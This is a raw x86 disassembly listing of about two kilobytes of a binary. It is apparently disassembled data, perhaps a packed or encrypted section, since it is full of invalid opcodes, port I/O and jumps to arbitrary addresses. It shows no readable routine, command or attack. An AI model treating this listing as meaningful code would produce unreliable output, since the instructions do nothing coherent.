  4227bf:	aad    0x7e
  4227c1:	mov    ch,0xad
  4227c3:	push   cs
  4227c4:	retf   0xcf8c
  4227c7:	icebp  
  4227c8:	ror    BYTE PTR [eax],0x63
  4227cb:	cli    
  4227cc:	iret   
  4227cd:	sub    BYTE PTR [edx+0x22],dl
  4227d0:	in     al,0xe6
  4227d2:	inc    eax
  4227d3:	fmul   QWORD PTR [edx-0x5b]
  4227d6:	adc    al,0xf7
  4227d8:	pop    es
  4227d9:	or     edi,esp
  4227db:	mov    ds:0x340d84e8,al
  4227e0:	lods   eax,DWORD PTR ds:[esi]
  4227e1:	mov    DWORD PTR [ecx],esp
  4227e3:	repz cmp ah,bh
  4227e6:	xor    al,0xb5
  4227e8:	jge    0x4227de
  4227ea:	xchg   ecx,eax
  4227eb:	adc    dh,al
  4227ed:	cld    
  4227ee:	and    BYTE PTR [ecx+0x53270936],al
  4227f4:	fdivp  st(5),st
  4227f6:	retf   0x17d4
  4227f9:	es push 0xa378ee4c
  4227ff:	cli    
  422800:	xor    eax,0xbf6036f3
  422805:	test   edx,ebx
  422807:	xor    esi,0x2c
  42280a:	mov    al,ds:0x76250334
  42280f:	xchg   ecx,eax
  422810:	or     DWORD PTR [eax+0x11],esp
  422813:	cwde   
  422814:	aad    0x20
  422816:	mov    WORD PTR [edi],gs
  422818:	mov    al,0x28
  42281a:	fsubr  st,st(0)
  42281c:	stos   DWORD PTR es:[edi],eax
  42281d:	inc    eax
  42281e:	push   edx
  42281f:	jle    0x422854
  422821:	push   es
  422822:	sbb    bh,0x30
  422825:	jo     0x4227b1
  422827:	sbb    cl,ch
  422829:	shl    BYTE PTR [ebp+0x6e],cl
  42282c:	cmc    
  42282d:	xor    eax,0x7d133b13
  422832:	mov    esp,0xa9ae0519
  422837:	or     eax,0x8953e960
  42283c:	aam    0xeb
  42283e:	push   esp
  42283f:	cmp    eax,0xdb008383
  422844:	pop    esi
  422845:	cwde   
  422846:	inc    edi
  422847:	xlat   BYTE PTR ds:[ebx]
  422848:	cmp    ah,cl
  42284a:	popa   
  42284b:	hlt    
  42284c:	fcmovnbe st,st(3)
  42284e:	adc    BYTE PTR [edx-0x21],dh
  422851:	cs rol ecx,1
  422854:	in     al,dx
  422855:	sub    DWORD PTR [edi],0x5f
  422858:	aam    0x8f
  42285a:	push   0xfffffff2
  42285c:	add    BYTE PTR [esi+0x54],bl
  42285f:	ror    BYTE PTR [esi],cl
  422861:	mov    dh,0x49
  422863:	addr16 and al,0x34
  422866:	add    BYTE PTR [edi+0x51c232d2],bl
  42286c:	push   cs
  42286d:	sbb    eax,0x4e8cd550
  422872:	push   esp
  422873:	scas   al,BYTE PTR es:[edi]
  422874:	nop
  422875:	push   cs
  422876:	xchg   esi,eax
  422877:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422878:	and    dl,BYTE PTR [eax-0x57]
  42287b:	retf   0xc8e6
  42287e:	cmp    edi,DWORD PTR [eax+0x76]
  422881:	pop    esi
  422882:	xchg   edi,eax
  422883:	cdq    
  422884:	sti    
  422885:	ins    BYTE PTR es:[edi],dx
  422886:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422887:	daa    
  422888:	and    dh,BYTE PTR [esi+ebp*8+0x6b]
  42288c:	int3   
  42288d:	loope  0x422894
  42288f:	pop    es
  422890:	jle    0x4228a4
  422892:	jae    0x42282a
  422894:	sbb    al,0x92
  422896:	dec    esp
  422897:	enter  0x7218,0xda
  42289b:	aas    
  42289c:	mov    bl,BYTE PTR [ebx+0x61e05444]
  4228a2:	dec    edx
  4228a3:	pushf  
  4228a4:	xor    edi,edi
  4228a6:	les    ecx,FWORD PTR [ecx-0x72]
  4228a9:	ins    BYTE PTR es:[edi],dx
  4228aa:	adc    bh,al
  4228ac:	sub    eax,0x18246462
  4228b1:	aad    0xb2
  4228b3:	mov    ah,0xc
  4228b5:	pop    edx
  4228b6:	adc    dh,dh
  4228b8:	xor    al,0x69
  4228ba:	mov    edi,0x49ec1fd0
  4228bf:	ds aad 0xb1
  4228c2:	sbb    ebp,eax
  4228c4:	pop    eax
  4228c5:	repz in eax,dx
  4228c7:	xchg   ebx,eax
  4228c8:	jnp    0x42290e
  4228ca:	icebp  
  4228cb:	pop    ds
  4228cc:	xor    bh,BYTE PTR [edx+0x4609376b]
  4228d2:	mov    eax,ss
  4228d4:	mov    ch,0x70
  4228d6:	sub    edi,DWORD PTR [ecx+0xbc782a8]
  4228dc:	sub    BYTE PTR [edx-0x77],0xa7
  4228e0:	xor    al,0x54
  4228e2:	sbb    cl,cl
  4228e4:	or     esi,DWORD PTR [eax+esi*8+0x6eae4393]
  4228eb:	and    al,0xbb
  4228ed:	push   edi
  4228ee:	push   es
  4228ef:	out    0xad,eax
  4228f1:	pusha  
  4228f2:	pop    edx
  4228f3:	mov    al,ds:0xc4aa733e
  4228f8:	fwait
  4228f9:	xchg   esp,eax
  4228fa:	fwait
  4228fb:	aad    0x56
  4228fd:	jno    0x42293f
  4228ff:	popa   
  422900:	lock shl DWORD PTR [eax+0x6ca47444],0x4a
  422908:	call   0xb8e65d6b
  42290d:	clc    
  42290e:	xlat   BYTE PTR ds:[ebx]
  42290f:	cwde   
  422910:	lahf   
  422911:	scas   eax,DWORD PTR es:[edi]
  422912:	loop   0x4228c7
  422914:	repnz and BYTE PTR [edi+0x2a28fad9],ch
  42291b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42291c:	xchg   ecx,eax
  42291d:	jbe    0x4228ad
  42291f:	inc    DWORD PTR [edi-0xa6ae246]
  422925:	push   0x69
  422927:	imul   esp,eax,0x4a2477ed
  42292d:	mov    cs,WORD PTR [edi+0x18]
  422930:	and    BYTE PTR [ebp+0x4d],0x65
  422934:	sub    bl,BYTE PTR [esi]
  422936:	xor    ebp,DWORD PTR [edx-0x5a]
  422939:	ja     0x4229b7
  42293b:	jge    0x422948
  42293d:	loop   0x422970
  42293f:	arpl   WORD PTR [eax+0x60],dx
  422942:	sub    DWORD PTR [edi+edx*8+0x37aeef60],esi
  422949:	mov    bl,0xaa
  42294b:	and    edx,DWORD PTR [esi+ecx*8+0x17]
  42294f:	push   0x36e473d8
  422954:	jo     0x4228f6
  422956:	push   ecx
  422957:	fcmovu st,st(3)
  422959:	adc    DWORD PTR [edx-0x4bffa7cb],ebx
  42295f:	pop    eax
  422960:	leave  
  422961:	daa    
  422962:	lods   al,BYTE PTR ds:[esi]
  422963:	inc    ebx
  422964:	mov    bl,BYTE PTR [eax]
  422966:	push   ecx
  422967:	jge    0x4228fa
  422969:	mov    DWORD PTR [eax-0x75],esi
  42296c:	outs   dx,DWORD PTR ds:[esi]
  42296d:	test   dl,cl
  42296f:	aaa    
  422970:	xchg   ebp,eax
  422971:	(bad)  
  422973:	lds    ebp,FWORD PTR [ebx]
  422975:	ds sub ebx,ebx
  422978:	push   esp
  422979:	mov    al,0x4b
  42297b:	xchg   esp,eax
  42297c:	sti    
  42297d:	stos   BYTE PTR es:[edi],al
  42297e:	pop    edi
  42297f:	(bad)  
  422980:	cli    
  422981:	mov    edx,edx
  422983:	daa    
  422984:	or     dh,BYTE PTR [ecx+0x63]
  422987:	in     al,0x2e
  422989:	repz pop ebx
  42298b:	xchg   ebx,eax
  42298c:	push   ds
  42298d:	leave  
  42298e:	jo     0x422960
  422990:	icebp  
  422991:	lds    eax,FWORD PTR [esp+edi*8]
  422994:	leave  
  422995:	popf   
  422996:	inc    eax
  422997:	sahf   
  422998:	rcr    DWORD PTR [ecx+0x311d3078],0xb7
  42299f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4229a0:	and    al,al
  4229a2:	jb     0x422992
  4229a4:	cmp    al,0xed
  4229a6:	jnp    0x4229ef
  4229a8:	pop    esp
  4229a9:	mov    eax,ds:0xdddc1e72
  4229ae:	mov    BYTE PTR [ecx],0x7f
  4229b1:	in     al,dx
  4229b2:	xchg   esi,eax
  4229b3:	add    al,0x30
  4229b5:	mov    esp,0x66b6cec8
  4229ba:	retf   0xe500
  4229bd:	jp     0x422959
  4229bf:	mov    edx,DWORD PTR [ecx-0x5f836311]
  4229c5:	std    
  4229c6:	cmp    bh,BYTE PTR [ecx+0x26393a74]
  4229cc:	sbb    BYTE PTR [edi+0x50e310da],dh
  4229d2:	mov    bl,0x4b
  4229d4:	or     eax,0x22ddfabc
  4229d9:	xlat   BYTE PTR ds:[ebx]
  4229da:	scas   eax,DWORD PTR es:[edi]
  4229db:	jl     0x422a05
  4229dd:	scas   eax,DWORD PTR es:[edi]
  4229de:	xor    eax,0xc20ad44e
  4229e3:	shl    bl,cl
  4229e5:	mov    DWORD PTR [eax],0x917647ab
  4229eb:	cmp    BYTE PTR [edi-0x20ce767b],ah
  4229f1:	pushf  
  4229f2:	inc    ebp
  4229f3:	loop   0x4229e9
  4229f5:	xchg   ecx,eax
  4229f6:	mov    ebp,0x1ec98876
  4229fb:	(bad)  
  4229fc:	dec    ebx
  4229fd:	xchg   ecx,eax
  4229fe:	data16 gs stos BYTE PTR es:[edi],al
  422a01:	cmp    al,0xc3
  422a03:	loopne 0x4229f6
  422a05:	std    
  422a06:	push   eax
  422a07:	mov    ch,0xe
  422a09:	enter  0x6482,0x6a
  422a0d:	sub    al,0xfd
  422a0f:	and    eax,0x5861389a
  422a14:	arpl   WORD PTR [edx],di
  422a16:	nop
  422a17:	dec    ebx
  422a18:	push   0x48
  422a1a:	ficom  WORD PTR [ebx+esi*4-0x11210746]
  422a21:	lea    ebx,[edx]
  422a23:	push   ds
  422a24:	shl    ecx,1
  422a26:	push   edi
  422a27:	rcl    DWORD PTR [eax],1
  422a29:	xchg   esi,eax
  422a2a:	mov    esp,0x7994689f
  422a2f:	rcl    BYTE PTR [edx],1
  422a31:	iret   
  422a32:	mov    esp,0xf9a79ada
  422a37:	pushf  
  422a38:	outs   dx,BYTE PTR ds:[esi]
  422a39:	mov    eax,0x54f6f232
  422a3e:	cmp    bl,BYTE PTR [ecx+edx*1-0x511c2e3d]
  422a45:	adc    DWORD PTR [ebp+0x62],ebp
  422a48:	mov    dh,BYTE PTR [esi+0x4e]
  422a4b:	ficomp DWORD PTR fs:[edx]
  422a4e:	inc    ebp
  422a4f:	and    BYTE PTR [ecx],ch
  422a51:	mov    ds:0x1a770b61,eax
  422a56:	sbb    esi,ecx
  422a58:	in     al,dx
  422a59:	sbb    eax,0x461702b8
  422a5e:	shr    ebp,cl
  422a60:	dec    ecx
  422a61:	retf   
  422a62:	adc    al,0xde
  422a64:	adc    esp,DWORD PTR [ebx-0x23]
  422a67:	mov    esi,DWORD PTR [ebx+edi*4-0x27]
  422a6b:	or     ah,ch
  422a6d:	fnstenv [eax]
  422a6f:	mov    DWORD PTR [edx+0x33],edi
  422a72:	arpl   WORD PTR [eax],dx
  422a74:	add    dl,0x28
  422a77:	hlt    
  422a78:	sub    BYTE PTR [eax+0x28],al
  422a7b:	arpl   WORD PTR [esi+0x70],bx
  422a7e:	and    dl,BYTE PTR [esi]
  422a80:	mov    dl,0x54
  422a82:	repnz or dl,BYTE PTR [ebx+0x4e]
  422a86:	call   0xd9a4:0x88ba76ec
  422a8d:	dec    edi
  422a8e:	fmul   QWORD PTR [ebx-0x46190241]
  422a94:	pop    ecx
  422a95:	pop    esp
  422a96:	jbe    0x422a30
  422a98:	loop   0x422a7a
  422a9a:	and    cl,BYTE PTR [ecx+0x48]
  422a9d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422a9e:	test   eax,0xab9cc909
  422aa3:	daa    
  422aa4:	xor    ebp,DWORD PTR [ebx]
  422aa6:	pop    eax
  422aa7:	ficomp WORD PTR [ebx]
  422aa9:	call   0xf49678f
  422aae:	loop   0x422ac6
  422ab0:	sub    ch,cl
  422ab2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422ab3:	jp     0x422a5d
  422ab5:	inc    esp
  422ab6:	fstp   DWORD PTR [ebp+edx*1+0x7a]
  422aba:	aas    
  422abb:	inc    esp
  422abc:	test   BYTE PTR [eax+ebp*2],ah
  422abf:	dec    edx
  422ac0:	adc    al,0x77
  422ac2:	data16 jae 0x422abe
  422ac5:	retf   
  422ac6:	in     eax,dx
  422ac7:	int3   
  422ac8:	aad    0xe6
  422aca:	jnp    0x422b1e
  422acc:	inc    esp
  422acd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422ace:	add    BYTE PTR [eax],al
  422ad0:	add    BYTE PTR [eax],al
  422ad2:	(bad)  
  422ad3:	xlat   BYTE PTR ds:[ebx]
  422ad4:	hlt    
  422ad5:	push   ebp
  422ad7:	jmp    FWORD PTR [ebx-0x21]
  422ada:	sub    al,0x7c
  422adc:	cmp    BYTE PTR [edx-0x5ec04ce5],bh
  422ae2:	and    DWORD PTR [ecx+eax*1+0x4f400],0xd0836e00
  422aed:	imul   ebx,DWORD PTR [ebx-0x41],0xaa18bb0f
  422af4:	ror    DWORD PTR [eax+0x55],1
  422af7:	inc    esp
  422af8:	sar    BYTE PTR [eax-0x1],1
  422afb:	cli    
  422afc:	and    edi,DWORD PTR [edi+0x787a11f8]
  422b02:	xor    BYTE PTR [ebp-0x9ede217],ah
  422b08:	mov    ebp,0x4ab68ea7
  422b0d:	xor    DWORD PTR [ecx],ebp
  422b0f:	inc    ebx
  422b10:	call   0xb448:0x22a4c5b6
  422b17:	and    bl,BYTE PTR [esi]
  422b19:	(bad)
  422b1c:	fmul   QWORD PTR [ebx+ebp*2]
  422b1f:	jae    0x422b74
  422b21:	adc    bh,BYTE PTR [ebp-0x23df2cc]
  422b27:	jmp    0x422ab3
  422b29:	cmp    eax,esp
  422b2b:	cmp    al,0xfb
  422b2d:	pushf  
  422b2e:	das    
  422b2f:	popf   
  422b30:	mov    dh,0x33
  422b32:	add    bl,BYTE PTR [eax-0x701b0f41]
  422b38:	mov    WORD PTR [ecx-0x4cafe3e6],ss
  422b3e:	pop    edx
  422b3f:	(bad)  
  422b40:	loope  0x422b9a
  422b42:	jmp    edi
  422b44:	test   DWORD PTR [esi-0x6a],0xc128cbd1
  422b4b:	adc    esi,DWORD PTR [eax]
  422b4d:	mov    dh,0x20
  422b4f:	inc    esp
  422b50:	daa    
  422b51:	jbe    0x422ad5
  422b53:	cmp    DWORD PTR [ebp-0x43c28163],edi
  422b59:	sbb    eax,0x39f275c6
  422b5e:	retf   0xdbf0
  422b61:	mov    ebp,0x2f3b3b80
  422b66:	push   ss
  422b67:	inc    eax
  422b68:	fldcw  WORD PTR [edi+ecx*1-0x67]
  422b6c:	retf   0x1966
  422b6f:	stos   BYTE PTR es:[edi],al
  422b70:	aas    
  422b71:	inc    edx
  422b72:	sub    eax,0x3634196a
  422b77:	les    ebp,FWORD PTR [edi-0x435345e5]
  422b7d:	(bad)  [ebx]
  422b7f:	pop    ss
  422b80:	ror    DWORD PTR [ebp+ebp*8+0x40],1
  422b84:	push   eax
  422b85:	inc    edx
  422b86:	sbb    al,0xad
  422b88:	bound  ebp,QWORD PTR [ecx-0xe]
  422b8b:	adc    DWORD PTR [edi-0x6e],ecx
  422b8e:	push   edi
  422b8f:	jl     0x422bd1
  422b91:	xchg   ebp,eax
  422b92:	push   edx
  422b93:	push   ss
  422b94:	test   DWORD PTR [ebp-0x1ee6ac95],ebx
  422b9a:	xor    DWORD PTR [eax+0x5c6d50d0],ebp
  422ba0:	sub    al,0x6d
  422ba2:	clc    
  422ba3:	sub    eax,0xd28789aa
  422ba8:	cmp    edi,DWORD PTR [edi-0x6d6cc7cf]
  422bae:	push   edx
  422baf:	in     ax,0x88
  422bb2:	arpl   WORD PTR [ebx+0x5f],sp
  422bb5:	imul   esi,ebp,0x2dfbff1c
  422bbb:	out    0x98,eax
  422bbd:	inc    edi
  422bbe:	adc    eax,0xcc711739
  422bc3:	inc    esi
  422bc4:	mov    al,0xfd
  422bc6:	fmul   st,st(6)
  422bc8:	fsub   DWORD PTR [eax-0x5db72ec5]
  422bce:	(bad)  
  422bcf:	int    0x7f
  422bd1:	adc    dl,dl
  422bd3:	sbb    esp,DWORD PTR [edi]
  422bd5:	xor    esp,DWORD PTR [ebp-0x50]
  422bd8:	int    0xd5
  422bda:	and    al,0x84
  422bdc:	outs   dx,BYTE PTR ds:[esi]
  422bdd:	xor    ch,BYTE PTR [edx]
  422bdf:	in     eax,dx
  422be0:	sbb    al,0x73
  422be2:	mov    al,0xb0
  422be4:	out    0xb9,eax
  422be6:	pushf  
  422be7:	rcl    DWORD PTR [eax+0x56],0x29
  422beb:	ret    
  422bec:	jnp    0x422b84
  422bee:	or     ch,BYTE PTR [ebx]
  422bf0:	mov    cs,WORD PTR [ebx+0x28f16090]
  422bf6:	ja     0x422bcf
  422bf8:	not    BYTE PTR [esi]
  422bfa:	jmp    0x9db67e91
  422bff:	mov    dh,BYTE PTR [esi-0x5ea5261f]
  422c05:	loope  0x422ba5
  422c07:	cwde   
  422c08:	mov    dh,0xd4
  422c0a:	xor    DWORD PTR [ecx-0x33f6bbcd],esp
  422c10:	jecxz  0x422bed
  422c12:	pusha  
  422c13:	add    BYTE PTR [edx+0xd],0x55
  422c17:	sub    DWORD PTR [ecx-0x34df13cb],eax
  422c1d:	push   ecx
  422c1e:	fiadd  DWORD PTR [esi]
  422c20:	fimul  WORD PTR [ecx-0x13388bd1]
  422c26:	push   0x42
  422c28:	fstp   DWORD PTR [ecx+ebp*4]
  422c2b:	sub    esp,edi
  422c2d:	out    0x80,al
  422c2f:	or     DWORD PTR [edx],ecx
  422c31:	shl    ebp,0x11
  422c34:	jle    0x422c2f
  422c36:	bound  eax,QWORD PTR ds:0x9bf71530
  422c3c:	add    bl,ah
  422c3e:	dec    edi
  422c3f:	rcl    BYTE PTR [ebp+0x79],cl
  422c42:	and    edx,DWORD PTR [ecx+edi*4-0x17]
  422c46:	cmp    al,0xae
  422c48:	stos   DWORD PTR es:[edi],eax
  422c49:	pop    esi
  422c4a:	lds    edx,FWORD PTR [edi-0x76]
  422c4d:	sahf   
  422c4e:	sub    al,0x1
  422c50:	mov    esi,0x6ea07b09
  422c55:	ficom  WORD PTR [eax]
  422c57:	test   BYTE PTR [eax],0xf2
  422c5a:	sbb    BYTE PTR [edi+0x8475e54],ch
  422c60:	ins    DWORD PTR es:[edi],dx
  422c61:	push   ebx
  422c62:	loopne 0x422cd0
  422c64:	or     dl,BYTE PTR [ebp-0x59]
  422c67:	fadd   DWORD PTR [ebp-0x76f0ba98]
  422c6d:	pop    esi
  422c6e:	mov    dl,0xae
  422c70:	pop    esi
  422c71:	cmp    ecx,DWORD PTR [edx+ecx*1]
  422c74:	shr    BYTE PTR [edx+0x29],1
  422c77:	shl    BYTE PTR [edx+eiz*2],0x2a
  422c7b:	dec    edx
  422c7c:	fsubp  st(6),st
  422c7e:	ror    BYTE PTR [ecx],0xaa
  422c81:	or     bl,cl
  422c83:	fimul  WORD PTR [ebp-0x7]
  422c86:	xor    cl,BYTE PTR [eax+0x7461d54a]
  422c8c:	or     al,0xaf
  422c8e:	or     al,0x1d
  422c90:	in     eax,dx
  422c91:	pop    ebx
  422c92:	int    0x69
  422c94:	pop    ebp
  422c95:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422c96:	std    
  422c97:	mov    bh,0x63
  422c99:	xor    ah,BYTE PTR [edx]
  422c9b:	xor    esi,esi
  422c9d:	or     ah,BYTE PTR [edx-0x4d8419d0]
  422ca3:	jno    0x422ce0
  422ca5:	(bad)  
  422ca6:	jmp    0x4ea461a9
  422cab:	std    
  422cac:	and    ebx,ebx
  422cae:	gs pop ss
  422cb0:	cmc    
  422cb1:	lss    ebp,FWORD PTR [ecx-0x2f0aa7b1]
  422cb8:	adc    ch,ch
  422cba:	dec    eax
  422cbb:	jno    0x422c6d
  422cbd:	and    eax,0xcac56ecd
  422cc2:	sbb    DWORD PTR [esi+0x21],ebx
  422cc5:	call   DWORD PTR [edi-0x5641ff13]
  422ccb:	add    ecx,DWORD PTR [ebx+0x2a]
  422cce:	push   ss
  422ccf:	push   ebx
  422cd0:	jg     0x422ca5
  422cd2:	xchg   BYTE PTR [ecx],bh
  422cd4:	ins    BYTE PTR es:[edi],dx
  422cd5:	mov    esi,0xad76519b
  422cda:	aad    0x12
  422cdc:	mov    ecx,0xd6870422
  422ce1:	stc    
  422ce2:	rcr    DWORD PTR [ecx],0x65
  422ce5:	lock mov bl,ch
  422ce8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422ce9:	jb     0x422d63
  422ceb:	jmp    0x32f6d1f8
  422cf0:	jnp    0x422c83
  422cf2:	push   ss
  422cf3:	rol    BYTE PTR [edi+esi*8+0x48],1
  422cf7:	mov    DWORD PTR [edx-0x22b4706d],eax
  422cfd:	and    eax,0x698842bc
  422d02:	xor    DWORD PTR cs:[edi+0x7],0x7b914f82
  422d0a:	(bad)
  422d0e:	pop    ds
  422d0f:	jns    0x422d25
  422d11:	call   0x7673:0x9051f01e
  422d18:	in     eax,dx
  422d19:	jecxz  0x422d41
  422d1b:	fistp  WORD PTR [edx]
  422d1d:	gs sbb ebx,ebp
  422d20:	std    
  422d21:	add    esi,esp
  422d23:	nop    DWORD PTR [ebx+0x6f]
  422d27:	mov    ah,dh
  422d29:	jnp    0x422cf7
  422d2b:	mov    dl,0x9b
  422d2d:	in     al,0x6b
  422d2f:	mov    edx,0x476af69f
  422d34:	mov    bh,0xb2
  422d36:	jl     0x422daf
  422d38:	(bad)  
  422d3a:	(bad)  
  422d3b:	dec    DWORD PTR [esi-0x2b47cfb1]
  422d41:	cli    
  422d42:	clc    
  422d43:	jnp    0x422d3f
  422d45:	adc    eax,0x44169290
  422d4a:	inc    esi
  422d4b:	jg     0x422dc3
  422d4d:	ret    0x412f
  422d50:	lods   eax,DWORD PTR ds:[esi]
  422d51:	icebp  
  422d52:	dec    ebp
  422d53:	aas    
  422d54:	mov    ds:0xcab9c17f,eax
  422d59:	jo     0x422d69
  422d5b:	sub    DWORD PTR [ecx+0x1cb0c82d],ecx
  422d61:	mov    ch,0xe2
  422d63:	xchg   ebx,eax
  422d64:	jno    0x422d33
  422d66:	push   ebp
  422d67:	cmp    al,0xd5
  422d69:	xchg   esi,eax
  422d6a:	or     BYTE PTR [ecx-0x78],cl
  422d6d:	pop    eax
  422d6e:	out    dx,al
  422d6f:	(bad)  
  422d70:	jb     0x422dbf
  422d72:	add    BYTE PTR [ebp+0xc90d345],0xae
  422d79:	add    dl,BYTE PTR [edx-0xbcd9691]
  422d7f:	jge    0x422dd3
  422d81:	dec    esi
  422d82:	pop    edx
  422d83:	inc    ebp
  422d84:	test   ecx,eax
  422d86:	outs   dx,BYTE PTR ds:[esi]
  422d87:	fadd   QWORD PTR [ebp-0x39]
  422d8a:	cli    
  422d8b:	xor    esi,edx
  422d8d:	jmp    0xdadda7c4
  422d92:	arpl   WORD PTR [ebx+0x73],sp
  422d95:	jns    0x422d54
  422d97:	repz inc edx
  422d99:	icebp  
  422d9a:	(bad)  
  422d9b:	(bad)  
  422d9c:	sar    bl,0xc3
  422d9f:	je     0x422da7
  422da1:	ret    0xb2b7
  422da4:	pop    ds
  422da5:	scas   eax,DWORD PTR es:[edi]
  422da6:	jns    0x422dc6
  422da8:	xor    al,0x95
  422daa:	xor    DWORD PTR [edx+0x68a8921c],esi
  422db0:	push   cs
  422db1:	scas   eax,DWORD PTR es:[edi]
  422db2:	and    BYTE PTR [edi-0x37ea3ebe],cl
  422db8:	jmp    0x3b1949d8
  422dbd:	inc    edi
  422dbe:	push   esi
  422dbf:	sub    eax,esp
  422dc1:	shl    DWORD PTR [edi],0xcd
  422dc4:	sbb    BYTE PTR [edx-0x5bf93ee6],dl
  422dca:	inc    ebp
  422dcb:	jle    0x422dfc
  422dcd:	jl     0x422df3
  422dcf:	xchg   DWORD PTR [esi-0x74],edx
  422dd2:	nop
  422dd3:	mov    DWORD PTR [eax-0x357957f9],ecx
  422dd9:	add    DWORD PTR [ecx+0x403de188],0xca944887
  422de3:	and    eax,0x8db94351
  422de8:	lea    eax,[edi]
  422dea:	imul   eax,DWORD PTR [eax-0x5ee4a460],0x2b
  422df1:	xchg   esp,eax
  422df2:	add    dl,ch
  422df4:	hlt    
  422df5:	mov    esi,0xa33d93d9
  422dfa:	mov    bl,cl
  422dfc:	pop    ebp
  422dfd:	call   0xacf6:0xa0c27389
  422e04:	add    DWORD PTR [ebx-0x5fe2d9a1],ebp
  422e0a:	mov    edx,0x12eb50a8
  422e0f:	sahf   
  422e10:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422e11:	inc    edi
  422e12:	mov    bh,0xf1
  422e14:	addr16 (bad) 
  422e16:	pop    esp
  422e17:	mov    bl,ch
  422e19:	dec    ebp
  422e1a:	outs   dx,BYTE PTR ds:[esi]
  422e1b:	sahf   
  422e1c:	push   0x20
  422e1e:	lock fwait
  422e20:	mov    dh,0xe0
  422e22:	inc    esp
  422e23:	jmp    FWORD PTR [edx]
  422e25:	icebp  
  422e26:	nop
  422e27:	push   ecx
  422e28:	fsub   st(0),st
  422e2a:	and    ebx,DWORD PTR [eax-0x33bf389d]
  422e30:	dec    edx
  422e32:	xor    DWORD PTR [ecx+0x24],0xf719854d
  422e39:	ss xchg ecx,eax
  422e3b:	sti    
  422e3c:	dec    esi
  422e3d:	cmc    
  422e3e:	rcl    edx,cl
  422e40:	rcl    edx,cl
  422e42:	retf   
  422e43:	pop    edx
  422e44:	inc    esp
  422e45:	inc    edx
  422e46:	cmp    al,0x64
  422e48:	aam    0xed
  422e4a:	mov    bh,0xaf
  422e4c:	xor    al,0xfa
  422e4e:	mov    dl,0x29
  422e50:	sub    edx,edi
  422e52:	mov    al,ds:0x9e98e8ef
  422e57:	and    eax,0x3ce8accc
  422e5c:	dec    esi
  422e5d:	fwait
  422e5e:	(bad)
  422e61:	adc    BYTE PTR ds:0x19e5e3bf,ah
  422e67:	adc    BYTE PTR [edi-0x2],cl
  422e6a:	push   cs
  422e6b:	in     eax,0x74
  422e6d:	into   
  422e6e:	out    0x87,al
  422e70:	(bad)  
  422e71:	adc    BYTE PTR [esp+esi*2-0x697c6f92],bh
  422e78:	int    0xb2
  422e7a:	ss mov ecx,0xea131476
  422e80:	mov    al,ds:0xf8a0af37
  422e85:	mov    edx,0xebf23fcc
  422e8a:	(bad)  
  422e8b:	mov    edi,0xe9215274
  422e90:	cmp    al,0xad
  422e92:	gs jbe 0x422ec6
  422e95:	mov    dh,0x36
  422e97:	pop    edx
  422e98:	pop    eax
  422e99:	stc    
  422e9a:	test   DWORD PTR [ecx-0x48],esi
  422e9d:	pop    ds
  422e9e:	dec    ecx
  422e9f:	stos   BYTE PTR es:[edi],al
  422ea0:	ss aas 
  422ea2:	test   eax,0xd8817836
  422ea7:	dec    edx
  422ea8:	in     al,0x90
  422eaa:	sub    BYTE PTR [ecx],al
  422eac:	cs test al,0xac
  422eaf:	mov    ch,bh
  422eb1:	ficom  WORD PTR [ebx+0x5f2c61f8]
  422eb7:	gs inc ebx
  422eb9:	out    0x3b,al
  422ebb:	or     DWORD PTR [edi],eax
  422ebd:	xchg   BYTE PTR [eax],dl
  422ebf:	jo     0x422f0f
  422ec1:	fcomp  st(3)
  422ec3:	int    0xc3
  422ec5:	fsub   DWORD PTR [eax+0x23ff4fc0]
  422ecb:	mov    dh,0x7a
  422ecd:	mov    edx,0x38227742
  422ed2:	aaa    
  422ed3:	fldcw  WORD PTR [ecx-0x2700001e]
  422ed9:	rcl    ah,cl
  422edb:	(bad)  
  422edc:	out    0x3c,eax
  422ede:	push   edx
  422edf:	mov    esi,0x278ef094
  422ee4:	enter  0xf1ec,0x79
  422ee8:	test   ch,dl
  422eea:	cmp    DWORD PTR [esi-0x1d],0x16
  422eee:	or     al,dl
  422ef0:	xchg   esi,eax
  422ef1:	(bad)  
  422ef2:	cwde   
  422ef3:	loope  0x422f5f
  422ef5:	mov    BYTE PTR [edx],ah
  422ef7:	jo     0x422e93
  422ef9:	or     eax,0x6e5f5ebc
  422efe:	xor    eax,0xcf2fe686
  422f03:	stos   BYTE PTR es:[edi],al
  422f04:	and    ah,ch
  422f06:	(bad)  
  422f07:	fwait
  422f08:	mov    al,0x56
  422f0a:	pop    esp
  422f0b:	les    edx,FWORD PTR [eax]
  422f0d:	ds pop edx
  422f0f:	mov    ecx,0x6511ba44
  422f14:	mov    ebx,0x8a053802
  422f19:	mov    dl,al
  422f1b:	push   ebx
  422f1c:	pop    ebx
  422f1d:	stc    
  422f1e:	mov    edx,0xefe5d181
  422f23:	hlt    
  422f24:	cmc    
  422f25:	mov    ebx,0x6bf0553
  422f2a:	out    dx,eax
  422f2b:	push   edi
  422f2c:	add    al,BYTE PTR [ecx]
  422f2e:	bnd je 0x422eb7
  422f31:	push   0x5a083b01
  422f36:	jg     0x422f3d
  422f38:	outs   dx,DWORD PTR ds:[esi]
  422f39:	das    
  422f3a:	push   cs
  422f3b:	mov    dh,0x8a
  422f3d:	imul   eax,DWORD PTR [edx],0xffffff9d
  422f40:	aas    
  422f41:	in     al,0xea
  422f43:	out    dx,eax
  422f44:	or     BYTE PTR [edx+0x75],0x46
  422f48:	add    ah,ah
  422f4a:	add    BYTE PTR [ebp-0x54c1a663],0x7c
  422f51:	(bad)  
  422f52:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422f53:	jp     0x422ef7
  422f55:	xchg   BYTE PTR [ebx-0x71],bl
  422f58:	push   esi
  422f59:	push   eax
  422f5a:	sbb    esp,DWORD PTR [edx-0x56]
  422f5d:	add    esi,DWORD PTR [esi+0x7e1d8d91]
  422f63:	push   cs
  422f64:	je     0x422f4b
  422f66:	mov    ch,0xe1
  422f68:	hlt    
  422f69:	stos   DWORD PTR es:[edi],eax
